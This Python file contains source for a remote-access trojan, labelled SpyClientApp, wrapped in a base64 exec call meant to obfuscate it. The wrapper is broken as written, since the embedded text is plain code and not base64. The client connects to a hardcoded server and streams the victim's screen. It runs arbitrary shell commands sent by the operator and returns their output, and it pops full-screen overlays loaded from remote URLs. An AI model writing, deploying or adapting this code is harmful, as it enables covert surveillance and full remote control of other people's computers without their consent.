import base64
exec(base64.b64decode('import socket
import struct
import threading
import time
import mss
import cv2
import numpy as np
import subprocess
import platform
import base64
import requests
import tempfile
import os
from PyQt5 import QtWidgets, QtCore, QtGui, QtMultimedia, QtMultimediaWidgets
import sys

HOST = '192.168.87.155'  # Update to your server IP
PORT = 9999

FRAME_WIDTH = 1280
FRAME_HEIGHT = 720
JPEG_QUALITY = 80
FPS = 60

HEADER_LEN = 4

def send_msg(sock, msg):
    msg_len = struct.pack('!I', len(msg))
    sock.sendall(msg_len + msg)

def recv_all(sock, length):
    data = b''
    while len(data) < length:
        packet = sock.recv(length - len(data))
        if not packet:
            return None
        data += packet
    return data

class OverlayWindow(QtWidgets.QWidget):
    def __init__(self, content_type, content, duration=10000):
        super().__init__()
        self.setWindowFlags(
            QtCore.Qt.WindowStaysOnTopHint | QtCore.Qt.FramelessWindowHint | QtCore.Qt.Tool
        )
        self.setAttribute(QtCore.Qt.WA_TranslucentBackground)
        self.setStyleSheet("background-color: rgba(0, 0, 0, 180);")

        screen = QtWidgets.QApplication.primaryScreen().geometry()
        self.setGeometry(screen)

        layout = QtWidgets.QVBoxLayout()
        layout.setAlignment(QtCore.Qt.AlignCenter)

        if content_type == "text":
            label = QtWidgets.QLabel(content)
            label.setStyleSheet("color: white; font-size: 36px;")
            label.setAlignment(QtCore.Qt.AlignCenter)
            layout.addWidget(label)

        elif content_type == "img":
            try:
                response = requests.get(content, timeout=5)
                response.raise_for_status()
                img = QtGui.QImage.fromData(response.content)
                pixmap = QtGui.QPixmap.fromImage(img)
                label = QtWidgets.QLabel()
                label.setPixmap(pixmap.scaled(600, 400, QtCore.Qt.KeepAspectRatio, QtCore.Qt.SmoothTransformation))
                label.setAlignment(QtCore.Qt.AlignCenter)
                layout.addWidget(label)
            except Exception as e:
                print(f"Failed to load image: {e}")
                self.close()
                return

        elif content_type == "vid":
            try:
                video_data = requests.get(content, timeout=10).content
                self.tmp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".mp4")
                self.tmp_file.write(video_data)
                self.tmp_file.flush()
                self.tmp_file.close()

                self.player = QtMultimedia.QMediaPlayer(None, QtMultimedia.QMediaPlayer.VideoSurface)
                video_widget = QtMultimediaWidgets.QVideoWidget()
                self.player.setVideoOutput(video_widget)
                layout.addWidget(video_widget)
                video_widget.setFixedSize(800, 450)

                self.player.setMedia(QtMultimedia.QMediaContent(QtCore.QUrl.fromLocalFile(self.tmp_file.name)))
                self.player.play()

                self.player.mediaStatusChanged.connect(self.handle_media_status)
                QtCore.QTimer.singleShot(duration, self.close)

            except Exception as e:
                print(f"Failed to play video: {e}")
                self.close()
                return

        self.setLayout(layout)
        self.show()

    def handle_media_status(self, status):
        if status == QtMultimedia.QMediaPlayer.EndOfMedia:
            self.close()

    def closeEvent(self, event):
        try:
            if hasattr(self, 'player'):
                self.player.stop()
            if hasattr(self, 'tmp_file'):
                os.unlink(self.tmp_file.name)
        except Exception:
            pass
        event.accept()

class SpyClientApp(QtWidgets.QApplication):
    def __init__(self, argv, sock):
        super().__init__(argv)
        self.sock = sock
        self.overlay = None
        self._overlay_content_type = None
        self._overlay_content = None

        self.video_thread = threading.Thread(target=self.video_sender, daemon=True)
        self.command_thread = threading.Thread(target=self.command_listener, daemon=True)
        self.video_thread.start()
        self.command_thread.start()

    def send_msg(self, msg):
        try:
            send_msg(self.sock, msg)
        except Exception as e:
            print(f"Failed to send message: {e}")

    def video_sender(self):
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            while True:
                img = np.array(sct.grab(monitor))
                img = cv2.resize(img, (FRAME_WIDTH, FRAME_HEIGHT))
                _, jpg = cv2.imencode('.jpg', img, [int(cv2.IMWRITE_JPEG_QUALITY), JPEG_QUALITY])
                data = b'VID0' + jpg.tobytes()
                try:
                    self.send_msg(data)
                except Exception as e:
                    print(f"Video send error: {e}")
                    break
                time.sleep(1 / FPS)

    def command_listener(self):
        while True:
            length_data = recv_all(self.sock, HEADER_LEN)
            if not length_data:
                print("Server disconnected")
                break
            msg_len = struct.unpack('!I', length_data)[0]
            msg = recv_all(self.sock, msg_len)
            if not msg:
                print("Server disconnected")
                break

            header = msg[:4]
            content = msg[4:]
            if header == b'CMD0':
                self.handle_command(content)
            else:
                print(f"Unknown header: {header}")

    def handle_command(self, content):
        try:
            decoded = base64.b64decode(content).decode(errors='ignore').strip()
        except Exception:
            decoded = content.decode(errors='ignore').strip()

        if decoded == "hostname":
            hostname = platform.node()
            self.send_response(f"Hostname: {hostname}")
        elif decoded.startswith("text:"):
            text = decoded[5:].strip()
            self.show_overlay("text", text)
        elif decoded.startswith("img:"):
            url = decoded[4:].strip()
            self.show_overlay("img", url)
        elif decoded.startswith("vid:"):
            url = decoded[4:].strip()
            self.show_overlay("vid", url)
        else:
            try:
                completed = subprocess.run(decoded, shell=True, capture_output=True, text=True, timeout=15)
                output = completed.stdout + completed.stderr
            except Exception as e:
                output = f"Command failed: {e}"
            self.send_response(output)

    def send_response(self, text):
        try:
            encoded = base64.b64encode(text.encode(errors='ignore'))
            msg = b'RSP0' + encoded
            send_msg(self.sock, msg)
        except Exception as e:
            print(f"Failed to send response: {e}")

    def show_overlay(self, content_type, content):
        self._overlay_content_type = content_type
        self._overlay_content = content
        QtCore.QMetaObject.invokeMethod(self, "do_show_overlay", QtCore.Qt.QueuedConnection)

    @QtCore.pyqtSlot()
    def do_show_overlay(self):
        if self.overlay and self.overlay.isVisible():
            self.overlay.close()
        self.overlay = OverlayWindow(self._overlay_content_type, self._overlay_content)
        self.overlay.show()

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((HOST, PORT))
        print(f"Connected to server {HOST}:{PORT}")
    except Exception as e:
        print(f"Connection failed: {e}")
        return

    app = SpyClientApp(sys.argv, sock)
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
').decode('shift_jis'))
